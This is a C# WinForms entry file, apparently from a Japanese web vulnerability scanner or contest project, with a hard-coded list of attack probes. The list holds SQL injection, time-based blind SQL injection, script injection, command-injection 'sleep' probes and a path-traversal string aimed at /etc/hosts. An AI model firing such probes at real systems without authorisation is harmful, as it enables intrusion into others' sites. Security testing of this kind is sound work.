using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MBSD
{
    static class Program
    {
        //アタックしたい設定を書き込む
        static List<string> attack = new List<string>
        {"user"                                                               ,"user" ,"1"    ,"100"  ,"302"  ,"1"    ,
         "admin"                                                              ,"admin","1"    ,"100"  ,"302"  ,"1"    ,
         "%27+or+1+%3D+1%3B+--"                                               ,"hoge" ,"1"    ,"100"  ,"302"  ,"1"    ,
         "' or 1 = 1 --"                                                      ,"hoge" ,"1"    ,"100"  ,"302"  ,"1"    ,
         "3;"                                                                 ,"hoge" ,"1"    ,"1"    ,"500"  ,"2"    ,
         "1%3D1%3B"                                                           ,"hoge" ,"1"    ,"100"  ,"500"  ,"2"    ,
         "insert"                                                             ,"hoge" ,"1"    ,"1"    ,"999"  ,"2"    ,
         "(select sleep (5))"                                                 ,"hoge" ,"1"    ,"10"   ,"999"  ,"3"    ,
         "%28select+sleep%285%29%29"                                          ,"hoge" ,"1"    ,"10"   ,"999"  ,"3"    ,
         "<script>alert%28\"Script\"%29%3B<%2Fscript>Hack"                    ,"hoge" ,"2"    ,"100"  ,"200"  ,"1"    ,
         "<script>alert(\"Script\");</script>Hack"                            ,"hoge" ,"2"    ,"100"  ,"200"  ,"1"    ,
         "<img src=1 onerror=alert(1)>Hack"                                   ,"hoge" ,"2"    ,"100"  ,"200"  ,"1"    ,
         ""                                                                   ,"hoge" ,"3"    ,"1"    ,"200"  ,"1"    ,
         "sleep 5"                                                            ,"hoge" ,"4"    ,"10"   ,"200"  ,"1"    ,
         "sleep+5"                                                            ,"hoge" ,"4"    ,"10"   ,"200"  ,"1"    ,
         ""                                                                   ,"hoge" ,"5"    ,"10"   ,"200"  ,"1"    ,
         "images/"                                                            ,"hoge" ,"5"    ,"10"   ,"200"  ,"1"    ,
         "static/"                                                            ,"hoge" ,"5"    ,"10"   ,"200"  ,"1"    ,
         "static/css"                                                         ,"hoge" ,"5"    ,"10"   ,"200"  ,"1"    ,
         ".htaccess"                                                          ,"hoge" ,"6"    ,"10"   ,"200"  ,"1"    ,
         "../../../../etc/hosts"                                              ,"hoge" ,"6"    ,"10"   ,"200"  ,"1"    ,
         "robots.txt"                                                         ,"hoge" ,"6"    ,"10"   ,"200"  ,"1"    
        };

        /// <summary>
        /// アプリケーションのメイン エントリ ポイントです。
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }


        public static List<string> getAttack()
        {
            return Program.attack;
        }
    }
}